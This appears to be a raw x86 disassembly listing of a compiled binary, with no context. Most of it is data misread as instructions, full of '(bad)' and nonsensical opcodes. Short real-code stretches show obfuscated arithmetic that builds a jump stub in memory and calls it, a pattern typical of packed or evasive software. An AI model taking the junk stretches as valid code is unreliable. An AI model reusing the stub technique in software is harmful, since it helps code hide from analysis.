  4100af:	inc    edx
  4100b0:	nop
  4100b1:	inc    ebp
  4100b2:	sbb    eax,0x32a6e796
  4100b7:	imul   ebx,esp,0xffffffa8
  4100ba:	test   eax,0x7c919e02
  4100bf:	icebp  
  4100c0:	addr16 sub esp,ebx
  4100c3:	(bad)  
  4100c4:	dec    BYTE PTR [esi-0x67c316e7]
  4100ca:	in     eax,0xd2
  4100cc:	test   eax,0xd1261a95
  4100d1:	out    dx,eax
  4100d2:	mov    ah,0xb5
  4100d4:	retf   
  4100d5:	mov    esi,0x1df4a009
  4100da:	push   edi
  4100db:	int    0x23
  4100dd:	dec    esi
  4100de:	in     al,0xb7
  4100e0:	(bad)  
  4100e1:	sbb    al,0x52
  4100e3:	and    DWORD PTR [edi+0x4b83e78f],0x62
  4100ea:	lahf   
  4100eb:	data16 fisttp DWORD PTR [ebp-0x1b439171]
  4100f2:	call   0x1f314227
  4100f7:	mov    ecx,0xcfa179b6
  4100fc:	inc    ecx
  4100fd:	push   es
  4100fe:	inc    esp
  4100ff:	mov    esi,DWORD PTR [ebx]
  410101:	js     0x4100f9
  410103:	pop    esi
  410104:	or     edi,eax
  410106:	sub    cl,ah
  410108:	push   0xffffff9b
  41010a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41010b:	ret    
  41010c:	sar    BYTE PTR [esp+edi*4-0x31],cl
  410110:	fs or  dh,dh
  410113:	jecxz  0x4100ff
  410115:	pop    ds
  410116:	xor    dl,BYTE PTR [ebx-0x49]
  410119:	ins    BYTE PTR es:[edi],dx
  41011a:	(bad)  
  41011b:	mov    ss,WORD PTR [edi-0x9]
  41011e:	(bad)  
  41011f:	mov    esp,0x98a8cdb
  410124:	ins    WORD PTR es:[edi],dx
  410126:	repnz sbb ch,BYTE PTR [ecx-0x45f1bdf5]
  41012d:	fistp  DWORD PTR ds:[ebx-0xe]
  410131:	xchg   ebp,eax
  410132:	mov    cl,0xc1
  410134:	push   ebx
  410135:	xlat   BYTE PTR ds:[ebx]
  410136:	gs fstp st(0)
  410139:	cmc    
  41013a:	test   al,0x7f
  41013c:	push   ss
  41013d:	add    DWORD PTR [esi-0x54],ebx
  410140:	imul   ebx,DWORD PTR [edx+0x4759bfb1],0xffffff84
  410147:	and    eax,0x9c35c9ae
  41014c:	inc    ecx
  41014d:	pop    ds
  41014e:	rcr    BYTE PTR [ebx-0x1],1
  410151:	js     0x4101bd
  410153:	(bad)  
  410154:	push   edi
  410155:	enter  0xba54,0x75
  410159:	mov    edi,0x90f1f399
  41015e:	cmp    BYTE PTR [eax+0x56],0x3e
  410162:	inc    ebx
  410163:	dec    ecx
  410164:	out    dx,eax
  410165:	lods   eax,DWORD PTR ds:[esi]
  410166:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410167:	push   edx
  410168:	mov    gs,WORD PTR [ecx-0x26e90aca]
  41016e:	xchg   ecx,eax
  41016f:	jne    0x4101d6
  410171:	pop    ebp
  410172:	jne    0x4101c5
  410174:	ds jecxz 0x4100f9
  410177:	rcr    BYTE PTR [eax-0x2ba8c9f1],cl
  41017d:	dec    ebx
  41017e:	sub    DWORD PTR [esi+edx*4],0x88873483
  410185:	dec    esi
  410186:	clc    
  410187:	dec    ebx
  410188:	mov    eax,0xf8578386
  41018d:	fiadd  DWORD PTR [ecx+0x4dd8cbfb]
  410193:	add    ch,BYTE PTR [eax-0x6346955d]
  410199:	dec    esp
  41019a:	cmp    ebp,DWORD PTR es:[esi+0x48]
  41019e:	(bad)  
  41019f:	cmp    eax,DWORD PTR [edx+0x7a7952fe]
  4101a5:	jge    0x410132
  4101a7:	shl    dh,0x4c
  4101aa:	(bad)  
  4101ab:	push   esi
  4101ac:	or     al,0x13
  4101ae:	popf   
  4101af:	mov    eax,0xded2f3cf
  4101b4:	nop
  4101b5:	imul   ecx,DWORD PTR [edi-0x2a13f622],0xffffffaf
  4101bc:	cmp    WORD PTR [esi],cx
  4101bf:	adc    eax,0xaf4e2811
  4101c4:	sahf   
  4101c5:	push   cs
  4101c6:	inc    eax
  4101c7:	or     DWORD PTR [edx],ecx
  4101c9:	cld    
  4101ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101cb:	mov    ss,WORD PTR [ecx-0x34]
  4101ce:	retf   0xa2ab
  4101d1:	jns    0x410212
  4101d3:	stos   BYTE PTR es:[edi],al
  4101d4:	pop    DWORD PTR [edi-0x76405884]
  4101da:	pop    esi
  4101db:	jmp    0x6629:0xe1e54ad8
  4101e2:	cmp    BYTE PTR [eax-0x739ae59e],0x3e
  4101e9:	pop    ds
  4101ea:	(bad)  
  4101eb:	adc    al,0x78
  4101ed:	ja     0x4101cc
  4101ef:	(bad)
  4101f2:	lea    ebp,[ecx]
  4101f4:	retf   
  4101f5:	push   cs
  4101f6:	hlt    
  4101f7:	(bad)  [esi-0x1f]
  4101fa:	add    al,0x0
  4101fc:	push   esp
  4101fd:	leave  
  4101fe:	out    0x8,al
  410200:	ss mov dh,0x1b
  410203:	push   esi
  410204:	(bad)  
  410205:	imul   eax,DWORD PTR [edx-0x1d],0xeebe7ebb
  41020c:	adc    ebx,DWORD PTR [esi+0x14]
  41020f:	sub    DWORD PTR [ebx-0x60ac7f55],edi
  410215:	inc    esp
  410216:	jmp    FWORD PTR [edx]
  410218:	fist   DWORD PTR [edx-0x1eed36a4]
  41021e:	mov    BYTE PTR [ecx+0x45e1bdf3],ch
  410224:	jne    0x41065f
  41022a:	mov    ecx,DWORD PTR [ebp-0x78]
  41022d:	xor    edx,edx
  41022f:	mov    eax,0x209c
  410234:	div    ecx
  410236:	mov    ecx,DWORD PTR ds:0x422568
  41023c:	mov    ecx,DWORD PTR [ecx+0x1a8]
  410242:	xor    edx,edx
  410244:	sub    ecx,eax
  410246:	mov    eax,DWORD PTR [ebp-0x4c]
  410249:	xor    eax,0x3daa
  41024e:	sub    eax,0x3375
  410253:	or     eax,0x6931
  410258:	lea    eax,[ebp+eax*1-0x6c25]
  41025f:	push   eax
  410260:	mov    eax,DWORD PTR [ebp-0x8c]
  410266:	push   0x18
  410268:	pop    esi
  410269:	div    esi
  41026b:	mov    esi,DWORD PTR [ebp-0x60]
  41026e:	xor    edx,edx
  410270:	div    esi
  410272:	mov    edx,DWORD PTR [ebp-0x44]
  410275:	mov    esi,DWORD PTR [ebp-0x34]
  410278:	xor    eax,edx
  41027a:	xor    edx,edx
  41027c:	div    esi
  41027e:	imul   eax,eax,0x7d2a
  410284:	sub    eax,0x928ded7
  410289:	push   eax
  41028a:	mov    eax,ds:0x422568
  41028f:	add    eax,0xaa
  410294:	push   eax
  410295:	mov    eax,DWORD PTR [ebp-0x3c]
  410298:	sub    ecx,eax
  41029a:	mov    eax,DWORD PTR [ebp-0x24]
  41029d:	push   DWORD PTR [ecx+eax*1+0xbd4]
  4102a4:	call   0x41e9f9
  4102a9:	mov    DWORD PTR [ebp-0x4],eax
  4102ac:	mov    ecx,DWORD PTR ds:0x422670
  4102b2:	lea    eax,[ebp+0x4]
  4102b5:	mov    DWORD PTR [ecx*4+0x422668],eax
  4102bc:	inc    DWORD PTR ds:0x422670
  4102c2:	mov    eax,DWORD PTR [ebp-0x4]
  4102c5:	mov    eax,DWORD PTR [ebp-0x4]
  4102c8:	xor    edx,edx
  4102ca:	shld   edx,eax,0x2
  4102ce:	shl    eax,0x2
  4102d1:	mov    ecx,0xca79a575
  4102d6:	mov    esi,0x9c1b89e8
  4102db:	xor    eax,ecx
  4102dd:	xor    edx,esi
  4102df:	cmp    eax,ecx
  4102e1:	jne    0x4105c9
  4102e7:	cmp    edx,esi
  4102e9:	jne    0x4105c9
  4102ef:	mov    eax,0xca79a571
  4102f4:	mov    edx,esi
  4102f6:	jmp    0x410669
  4102fb:	jmp    0x4105c9
  410300:	sbb    al,0xfc
  410302:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410303:	fs sbb bl,BYTE PTR es:[edx]
  410307:	mov    ebp,0x70cf8d86
  41030c:	sub    al,0xea
  41030e:	xor    DWORD PTR [esi+0x181892c3],edi
  410314:	mov    esi,0x31181814
  410319:	xchg   esi,eax
  41031a:	jo     0x410312
  41031c:	pop    esi
  41031d:	out    dx,al
  41031e:	push   esp
  41031f:	call   0x378dcf92
  410324:	dec    ebx
  410325:	add    bl,BYTE PTR [edi+eiz*1+0x2b5896ed]
  41032c:	cmc    
  41032d:	lds    eax,FWORD PTR [eax-0x45]
  410330:	cmp    al,0x77
  410332:	test   DWORD PTR [edx-0x12d1d7c6],esi
  410338:	pop    edi
  410339:	sub    BYTE PTR [ebp-0x7d0990c6],0x11
  410340:	retf   0x69cc
  410343:	fwait
  410344:	lahf   
  410345:	pop    ecx
  410346:	mov    dh,0xae
  410348:	ds pop ebx
  41034a:	jo     0x4103cb
  41034c:	mov    edx,0x9ad94f78
  410351:	cmp    esp,esi
  410353:	(bad)  
  410354:	lahf   
  410355:	mov    ebp,0x9aed8df0
  41035a:	jmp    0x259d7154
  41035f:	mov    esp,0x5fb12a72
  410364:	out    dx,al
  410365:	and    DWORD PTR [eax],ebp
  410367:	mov    BYTE PTR [esi+ebx*1],dh
  41036a:	pop    edx
  41036b:	jno    0x41036a
  41036d:	ins    BYTE PTR es:[edi],dx
  41036e:	pop    edx
  41036f:	dec    ebp
  410370:	pushf  
  410371:	leave  
  410372:	dec    eax
  410373:	(bad)  
  410375:	inc    ebx
  410376:	mov    esi,0x7f96bc13
  41037b:	mov    DWORD PTR [eax+0x78],esi
  41037e:	jle    0x4103ca
  410380:	(bad)  
  410381:	push   ecx
  410382:	into   
  410383:	repz jbe 0x41033c
  410386:	loop   0x410359
  410388:	xor    al,0x1
  41038a:	mov    bl,0x72
  41038c:	adc    al,0x56
  41038e:	aaa    
  41038f:	cmp    ebx,esi
  410391:	bound  ecx,QWORD PTR es:[edi]
  410394:	ret    0x5630
  410397:	mov    ah,0xcd
  410399:	dec    eax
  41039a:	cmp    al,0x72
  41039c:	je     0x410417
  41039e:	fist   WORD PTR [ecx+edi*1+0x8]
  4103a2:	sub    al,0xdd
  4103a4:	imul   esi,DWORD PTR [edx],0xffffffeb
  4103a7:	sbb    esi,DWORD PTR [ebx+0x71]
  4103aa:	jg     0x4103b8
  4103ac:	jns    0x410396
  4103ae:	adc    eax,DWORD PTR [ebx]
  4103b0:	scas   al,BYTE PTR es:[edi]
  4103b1:	dec    esp
  4103b2:	pushf  
  4103b3:	inc    edx
  4103b4:	lods   al,BYTE PTR ds:[esi]
  4103b5:	fdivp  st(2),st
  4103b7:	pop    eax
  4103b8:	out    0x72,eax
  4103ba:	xor    eax,0x8620cf40
  4103bf:	push   ecx
  4103c0:	out    dx,al
  4103c1:	call   0x7d3d:0x4751c4b0
  4103c8:	jno    0x4103a3
  4103ca:	fwait
  4103cb:	repz sbb al,0xbc
  4103ce:	fild   WORD PTR [edx+0x6c]
  4103d1:	jp     0x410416
  4103d3:	(bad)  
  4103d4:	in     eax,dx
  4103d5:	es jb  0x410397
  4103d8:	in     eax,0x54
  4103da:	push   edx
  4103db:	hlt    
  4103dc:	inc    eax
  4103dd:	mov    eax,ds:0x627afef9
  4103e2:	cmp    BYTE PTR [eax-0x4f19eba2],cl
  4103e8:	es sahf 
  4103ea:	loopne 0x410430
  4103ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103ed:	out    dx,eax
  4103ee:	repnz adc ebp,DWORD PTR [esi]
  4103f1:	ja     0x41046b
  4103f3:	adc    al,0x4b
  4103f5:	add    DWORD PTR [ebx+0x30126738],esp
  4103fb:	pop    ebx
  4103fc:	inc    ebp
  4103fd:	and    DWORD PTR [edx-0x3e505aa0],edi
  410403:	bound  edi,QWORD PTR [ecx+ebx*8]
  410406:	in     al,0xf8
  410408:	jl     0x4103d5
  41040a:	xchg   eax,esi
  41040c:	je     0x4103cc
  41040e:	data16 mov BYTE PTR [ecx],bl
  410411:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410412:	mov    al,0x3a
  410414:	push   esp
  410415:	pop    eax
  410416:	pop    esp
  410417:	inc    esp
  410418:	ds out dx,al
  41041a:	push   esi
  41041b:	push   ds
  41041c:	mov    bh,0xe9
  41041e:	jno    0x41042f
  410420:	add    ah,BYTE PTR ds:0x75446d2e
  410426:	adc    bh,BYTE PTR ds:0xc0a37eff
  41042c:	and    edi,ecx
  41042e:	adc    DWORD PTR [eax-0x4455f2dd],eax
  410434:	push   esp
  410435:	ret    
  410436:	inc    ebx
  410437:	add    ah,dl
  410439:	add    eax,0x605e1959
  41043e:	jne    0x4103fc
  410440:	dec    ebp
  410441:	xchg   esi,eax
  410442:	ins    DWORD PTR es:[edi],dx
  410443:	push   es
  410444:	mov    edx,0x971d74eb
  410449:	sub    edx,ebx
  41044b:	mov    dh,bl
  41044d:	fs retf 0x8e4
  410451:	or     al,0xab
  410453:	pop    edi
  410454:	cld    
  410455:	test   eax,0x2d99245a
  41045a:	lock or eax,0xc7e98dae
  410460:	stc    
  410461:	inc    esp
  410462:	xchg   esp,eax
  410463:	pop    edi
  410464:	dec    esi
  410465:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410466:	mov    cl,0x69
  410468:	sbb    eax,DWORD PTR [ebp+edx*4-0x102a8f49]
  41046f:	int3   
  410470:	out    0xe7,eax
  410472:	mov    dl,0x6a
  410474:	cs jecxz 0x4104db
  410477:	add    DWORD PTR [ebx],esp
  410479:	je     0x4104c4
  41047b:	jg     0x4104d8
  41047d:	xor    ecx,DWORD PTR [ebx]
  41047f:	sub    BYTE PTR [ecx-0x70],bh
  410482:	xor    BYTE PTR [eax],0xb6
  410485:	pushf  
  410486:	out    dx,al
  410487:	out    dx,al
  410488:	inc    edx
  410489:	cli    
  41048a:	and    esp,eax
  41048c:	pop    ebx
  41048d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41048e:	test   eax,0x7c372f9d
  410493:	jmp    0x410512
  410495:	mov    cl,0x19
  410497:	dec    ebp
  410498:	jnp    0x4104cd
  41049a:	sub    bl,BYTE PTR [ebx+0xbd64468]
  4104a0:	mov    dh,0xc7
  4104a2:	sbb    al,0x1b
  4104a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104a5:	push   es
  4104a6:	cmc    
  4104a7:	xor    al,0xbc
  4104a9:	retf   0x3758
  4104ac:	xor    DWORD PTR [ecx+0x2d],ebx
  4104af:	xchg   esi,eax
  4104b0:	mov    cl,dl
  4104b2:	mov    ecx,ebp
  4104b4:	enter  0xf88a,0x91
  4104b8:	mov    WORD PTR [edi+eax*8+0x49],?
  4104bc:	cmp    dl,bh
  4104be:	adc    esi,ebp
  4104c0:	cmp    ecx,ecx
  4104c2:	lods   al,BYTE PTR ds:[esi]
  4104c3:	data16 ror BYTE PTR [edx],1
  4104c6:	enter  0xa1f7,0xf5
  4104ca:	sbb    cl,dh
  4104cc:	stos   DWORD PTR es:[edi],eax
  4104cd:	lock cwde 
  4104cf:	pop    eax
  4104d0:	aaa    
  4104d1:	std    
  4104d2:	int3   
  4104d3:	call   0xfe4d:0xb1adb839
  4104da:	mov    ds:0x91e60057,al
  4104df:	sub    ebp,esp
  4104e1:	in     al,dx
  4104e2:	mov    ss,ebx
  4104e4:	outs   dx,BYTE PTR ds:[esi]
  4104e5:	cmp    bh,BYTE PTR [edx+0x376979bf]
  4104eb:	push   ebx
  4104ec:	cli    
  4104ed:	xor    eax,0x37d093e9
  4104f2:	(bad)  
  4104f3:	cli    
  4104f4:	test   eax,0x9d5c2c11
  4104f9:	in     al,0x1d
  4104fb:	mov    ecx,0xf2624c00
  410500:	pop    ebp
  410501:	(bad)  
  410502:	lods   al,BYTE PTR ds:[esi]
  410503:	pop    edi
  410504:	sub    eax,0x7e87f43
  410509:	js     0x41049f
  41050b:	ja     0x410558
  41050d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41050f:	mov    sp,0x3ae8
  410513:	cmc    
  410514:	jecxz  0x410517
  410516:	inc    edi
  410517:	dec    ebp
  410518:	dec    ebx
  410519:	push   0x61
  41051b:	and    DWORD PTR [ecx-0x1842b6f],eax
  410521:	(bad)  
  410522:	ja     0x41050d
  410524:	lea    edx,[esi-0xb]
  410527:	pop    esi
  410528:	(bad)  
  410529:	fisttp QWORD PTR [edi+0x9923e34]
  41052f:	ror    DWORD PTR [edx-0x5f15d5f1],1
  410535:	push   edi
  410536:	and    al,0xfc
  410538:	xor    al,0x6d
  41053a:	jo     0x410594
  41053c:	je     0x410530
  41053e:	mov    ds:0x2bbea045,al
  410543:	shl    ebp,cl
  410545:	rcl    bh,0x81
  410548:	or     BYTE PTR [esi],bh
  41054a:	fdivr  DWORD PTR [esi-0x2d]
  41054d:	pop    edi
  41054e:	sbb    al,0xa5
  410550:	jnp    0x41059c
  410552:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410553:	scas   eax,DWORD PTR es:[edi]
  410554:	or     ebx,DWORD PTR [esi-0x1195481f]
  41055a:	dec    edi
  41055b:	(bad)  
  41055c:	stc    
  41055d:	cmp    BYTE PTR gs:[edi-0x28],bh
  410561:	scas   al,BYTE PTR es:[edi]
  410562:	xchg   edi,eax
  410563:	jae    0x41053f
  410565:	inc    ecx
  410566:	leave  
  410567:	in     al,dx
  410568:	push   0xb5f93d2f
  41056d:	and    ebp,edx
  41056f:	int3   
  410570:	sbb    eax,0xe4ef6d5
  410575:	xchg   DWORD PTR [eax],ebp
  410577:	cmp    al,0x50
  410579:	ret    
  41057a:	add    ah,bh
  41057c:	push   edi
  41057d:	stc    
  41057e:	xor    DWORD PTR [ecx-0x1c24e59a],esp
  410584:	inc    ebp
  410585:	mov    dl,0x11
  410587:	push   ebx
  410588:	add    BYTE PTR [ebx+eax*2+0x20],bh
  41058c:	and    ax,0x2133
  410590:	inc    esi
  410591:	cmp    edx,DWORD PTR [eax]
  410593:	test   eax,0x21a0d0a0
  410598:	je     0x4105fa
  41059a:	xor    esp,DWORD PTR [edi-0x3d]
  41059d:	mov    ds:0xa5c1dd66,al
  4105a2:	push   ss
  4105a3:	sbb    BYTE PTR [edx+0x40567e0],ah
  4105a9:	test   BYTE PTR [eax],0xd2
  4105ac:	dec    ebx
  4105ad:	sub    bh,bl
  4105af:	sub    ah,ah
  4105b1:	adc    dl,BYTE PTR [ebx]
  4105b3:	dec    ebp
  4105b4:	sub    eax,DWORD PTR [eax+0x75]
  4105b7:	sti    
  4105b8:	in     al,dx
  4105b9:	leave  
  4105ba:	adc    esi,DWORD PTR [ecx]
  4105bc:	xchg   edi,eax
  4105bd:	inc    ebx
  4105be:	pop    esp
  4105bf:	rcl    DWORD PTR [esi-0x7d],0xe8
  4105c3:	es mov ah,0xcb
  4105c6:	jl     0x41059f
  4105c8:	lea    eax,[di-0x10]
  4105cc:	mov    DWORD PTR [ebp-0x9c],eax
  4105d2:	mov    eax,DWORD PTR [ebp-0x54]
  4105d5:	mov    DWORD PTR [ebp-0x10],eax
  4105d8:	mov    eax,DWORD PTR [ebp-0x10]
  4105db:	mov    ecx,DWORD PTR [ebp-0x4]
  4105de:	sub    eax,ecx
  4105e0:	mov    DWORD PTR [ebp-0x10],eax
  4105e3:	mov    eax,DWORD PTR [ebp-0x20]
  4105e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4105e9:	sub    DWORD PTR [ebp-0x10],eax
  4105ec:	mov    eax,DWORD PTR [ebp-0x4]
  4105ef:	mov    DWORD PTR [eax],0x658776e9
  4105f5:	mov    DWORD PTR [eax+0x4],0xab756547
  4105fc:	mov    eax,DWORD PTR [ebp-0x10]
  4105ff:	mov    ecx,DWORD PTR [ebp-0x4]
  410602:	mov    DWORD PTR [ecx+0x1],eax
  410605:	mov    eax,ds:0x4223e4
  41060a:	push   DWORD PTR [eax]
  41060c:	push   DWORD PTR ds:0x422658
  410612:	push   DWORD PTR ds:0x4223ec
  410618:	push   DWORD PTR ds:0x422638
  41061e:	push   DWORD PTR ds:0x4226ac
  410624:	push   0xa4069aaa
  410629:	push   0xa4069aae
  41062e:	push   DWORD PTR [ebp-0x5c]
  410631:	mov    eax,DWORD PTR [ebp-0x4]
  410634:	call   eax
  410636:	mov    eax,DWORD PTR [edi]
  410638:	mov    eax,DWORD PTR [ebp+0x8]
  41063b:	push   DWORD PTR [eax]
  41063d:	call   0x4110ff
  410642:	mov    eax,ds:0x422568
  410647:	push   0x4
  410649:	add    eax,0x1dc
  41064e:	push   eax
  41064f:	push   edi
  410650:	call   0x415231
  410655:	mov    eax,0xca79a57d
  41065a:	jmp    0x4102f4
  41065f:	mov    eax,0xca79a575
  410664:	mov    edx,0x9c1b89e8
  410669:	pop    esi
  41066a:	pop    ebx
  41066b:	leave  
  41066c:	ret    0x4
  41066f:	push   ebp
  410670:	mov    ebp,esp
  410672:	sub    esp,0x20
  410675:	push   ebx
  410676:	push   edi
  410677:	mov    DWORD PTR [ebp-0x8],0x522e
  41067e:	mov    DWORD PTR [ebp-0x4],0x3dbd
  410685:	mov    DWORD PTR [ebp-0x10],0x53f1
  41068c:	mov    DWORD PTR [ebp-0xc],0x631b
  410693:	mov    DWORD PTR [ebp-0x18],0x524d
  41069a:	mov    DWORD PTR [ebp-0x14],0x1600
  4106a1:	mov    eax,DWORD PTR [ebp-0x18]
  4106a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4106a7:	mov    edx,DWORD PTR [ebp-0x10]
  4106aa:	mov    edi,DWORD PTR [ebp-0xc]
  4106ad:	push   edi
  4106ae:	push   edx
  4106af:	push   ecx
  4106b0:	push   eax
  4106b1:	call   0x416c20
  4106b6:	mov    ecx,DWORD PTR [ebp-0x8]
  4106b9:	mov    edi,DWORD PTR [ebp-0x4]
  4106bc:	add    eax,0x1dc8
  4106c1:	adc    edx,0x6fbf
  4106c7:	and    edx,edi
  4106c9:	push   0x1061
  4106ce:	and    eax,ecx
  4106d0:	or     edx,0x23ff
  4106d6:	push   0x4000022f
  4106db:	jmp    0x4109bb
  4106e0:	pop    edi
  4106e1:	jp     0x410689
  4106e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106e4:	mov    ds:0x103a5b1c,al
  4106e9:	fsub   QWORD PTR [edi-0x44]
  4106ec:	and    DWORD PTR [ecx-0x7197950e],eax
  4106f2:	sbb    BYTE PTR [eax],bl
  4106f4:	call   0x83ba:0x5f181814
  4106fb:	sub    BYTE PTR [esi+0x6085652b],dh
  410701:	int3   
  410702:	inc    edi
  410703:	add    eax,0x87fa6f14
  410708:	hlt    
  410709:	mov    edi,ss
  41070b:	int3   
  41070c:	xchg   esp,eax
  41070d:	pop    edx
  41070e:	outs   dx,BYTE PTR ds:[esi]
  41070f:	repz scas al,BYTE PTR es:[edi]
  410711:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410712:	xor    edx,DWORD PTR [esi]
  410714:	pop    edx
  410715:	outs   dx,DWORD PTR ds:[esi]
  410716:	jge    0x4106e4
  410718:	adc    BYTE PTR [edx-0xb],bh
  41071b:	int    0x90
  41071d:	out    0xf9,al
  41071f:	retf   
  410720:	rcr    DWORD PTR [ebx+0x7bbec02f],0xa7
  410727:	mov    ch,0x5a
  410729:	test   BYTE PTR [edx-0x20],bh
  41072c:	add    ch,cl
  41072e:	out    dx,al
  41072f:	ins    DWORD PTR es:[edi],dx
  410730:	daa    
  410731:	inc    eax
  410732:	cmp    esi,DWORD PTR [edx-0x33]
  410735:	enter  0x7a96,0x49
  410739:	jecxz  0x4106fb
  41073b:	inc    eax
  41073c:	mov    ds:0x4054ec01,eax
  410741:	out    0xc4,eax
  410743:	cld    
  410744:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410745:	xor    DWORD PTR [esi+0x72],ecx
  410748:	push   0x32
  41074a:	jmp    0x41078a
  41074c:	xchg   ecx,ecx
  41074e:	sub    edx,esp
  410750:	out    0xda,eax
  410752:	cdq    
  410753:	xor    BYTE PTR [edi-0x601a1ee0],ah
  410759:	out    dx,eax
  41075a:	(bad)  
  41075b:	jo     0x410791
  41075d:	push   ecx
  41075e:	sub    al,0x9b
  410760:	mov    eax,ds:0x5f31f7e6
  410765:	mov    ds:0x9fb9b98c,al
  41076a:	push   esp
  41076b:	outs   dx,BYTE PTR ds:[esi]
  41076c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41076d:	aad    0x45
  41076f:	mov    ecx,0x3be6ea4d
  410774:	or     ch,bh
  410776:	dec    edi
  410777:	fcmovu st,st(1)
  410779:	int3   
  41077a:	push   esp
  41077b:	sbb    esi,DWORD PTR [edx-0x77c57ce8]
  410781:	cs sbb al,0xfb
  410784:	bnd jo 0x41077c
  410787:	inc    ebp
  410788:	hlt    
  410789:	xor    al,0xca
  41078b:	shl    BYTE PTR [ebx-0x36],0x75
  41078f:	push   ebx
  410790:	sub    BYTE PTR [ecx+0x12],dh
  410793:	pop    esi
  410794:	or     eax,0xe370fc68
  410799:	pop    es
  41079a:	sub    esi,DWORD PTR [ebp+0x26]
  41079d:	xchg   ah,ch
  41079f:	xchg   DWORD PTR [esi+0x52],eax
  4107a2:	push   ds
  4107a3:	int    0x38
  4107a5:	retf   0x3df7
  4107a8:	jae    0x41077f
  4107aa:	sbb    si,WORD PTR [ecx+0x73b2458d]
  4107b1:	fimul  WORD PTR [ebx+ebx*4+0x234faf64]
  4107b8:	pop    es
  4107b9:	add    BYTE PTR [eax+ecx*8+0x469e55fc],bh
  4107c0:	pop    ecx
  4107c1:	xor    ebx,esi
  4107c3:	repz mov al,ds:0x7af695d6
  4107c9:	sbb    al,0xe3
  4107cb:	stos   BYTE PTR es:[edi],al
  4107cc:	and    eax,0xfede1caf
  4107d1:	es cs int 0x9c
  4107d5:	data16 into 
  4107d7:	loopne 0x41076c
  4107d9:	sbb    eax,DWORD PTR [ebp-0x5f]
  4107dc:	(bad)  
  4107dd:	loopne 0x410761
  4107df:	jbe    0x410847
  4107e1:	mov    eax,ds:0xb6244cfb
  4107e6:	mov    ah,0x4
  4107e8:	int3   
  4107e9:	inc    ebp
  4107ea:	jmp    DWORD PTR [ecx-0x17]
  4107ed:	xchg   ecx,eax
  4107ee:	icebp  
  4107ef:	es jmp 0xd4ae72f2
  4107f5:	or     ebp,DWORD PTR [esi]
  4107f7:	push   edi
  4107f8:	mov    eax,ds:0xf2f80c90
  4107fd:	mov    ebx,0xc6bfc66
  410802:	sbb    bl,BYTE PTR [ebx-0x44]
  410805:	jle    0x410789
  410807:	and    eax,0x96a4aff2
  41080c:	data16 hlt 
  41080e:	sbb    al,0xb9
  410810:	das    
  410811:	aaa    
  410812:	not    DWORD PTR [ecx-0x6bdc5770]
  410818:	push   es
  410819:	push   ecx
  41081a:	xchg   edi,eax
  41081b:	inc    edi
  41081c:	push   esp
  41081d:	not    DWORD PTR [esi]
  41081f:	pop    esp
  410820:	sbb    bh,bh
  410822:	in     al,0x99
  410824:	movntq QWORD PTR [ecx+eiz*8-0x513fa3e1],mm0
  41082c:	sub    al,0xf7
  41082e:	shl    DWORD PTR ds:0x238913c5,cl
  410834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410835:	jae    0x4107ea
  410837:	and    dl,BYTE PTR [ecx]
  410839:	and    al,0x39
  41083b:	mov    dh,0xe0
  41083d:	push   esp
  41083e:	ja     0x4108b2
  410840:	in     eax,dx
  410841:	shl    edx,cl
  410843:	jg     0x4108a2
  410845:	ret    
  410846:	mov    es,WORD PTR [ebp+ecx*4-0x12f799d9]
  41084d:	xchg   BYTE PTR fs:[eax-0x2f],bh
  410851:	and    eax,0xaa05e00
  410856:	cwde   
  410857:	mov    ah,0x85
  410859:	dec    ebx
  41085a:	das    
  41085b:	cmp    ch,BYTE PTR [esi+0x5539c890]
  410861:	loop   0x4107e5
  410863:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410865:	out    dx,al
  410866:	aad    0x85
  410868:	jp     0x41089c
  41086a:	std    
  41086b:	sbb    DWORD PTR [esi+0x11],esp
  41086e:	mov    esi,0xea7f66f2
  410873:	int    0x7a
  410875:	mov    BYTE PTR [ebx+0x68beb6d3],ah
  41087b:	loop   0x410814
  41087d:	ror    BYTE PTR [edx+0x37],cl
  410880:	popa   
  410881:	mov    ebx,DWORD PTR ds:0x2e3951fb
  410887:	dec    esi
  410888:	pop    esi
  410889:	dec    ecx
  41088a:	jge    0x4108d7
  41088c:	scas   eax,DWORD PTR es:[edi]
  41088d:	into   
  41088e:	test   al,0xd9
  410890:	(bad)  
  410891:	fwait
  410892:	call   0xf9b0:0x58a3d5cc
  410899:	ins    DWORD PTR es:[edi],dx
  41089a:	(bad)
  41089d:	cmp    dh,BYTE PTR [esi]
  41089f:	rol    BYTE PTR [edi+0x24],cl
  4108a2:	rol    DWORD PTR ds:0x483300f,1
  4108a8:	push   0xf7319087
  4108ad:	nop
  4108ae:	icebp  
  4108af:	push   esi
  4108b0:	cmc    
  4108b1:	daa    
  4108b2:	mov    ds,WORD PTR [ecx]
  4108b4:	inc    esi
  4108b5:	arpl   WORD PTR [edi-0x771f1eb4],dx
  4108bb:	mov    ecx,DWORD PTR ds:0x73e783da
  4108c1:	ss ret 0xb5e1
  4108c5:	cmp    al,0xcc
  4108c7:	sub    edi,esp
  4108c9:	inc    esp
  4108ca:	imul   edx,DWORD PTR ds:0xebf277ea,0x18aacd76
  4108d4:	xor    eax,0xaa301db2
  4108d9:	arpl   WORD PTR [edx-0x2c],ax
  4108dc:	dec    ecx
  4108dd:	mov    esi,0x99556457
  4108e2:	call   0xa905:0x7c9bb9e7
  4108e9:	ins    BYTE PTR es:[edi],dx
  4108ea:	mov    ?,WORD PTR [ebx-0x10]
  4108ed:	stos   BYTE PTR es:[edi],al
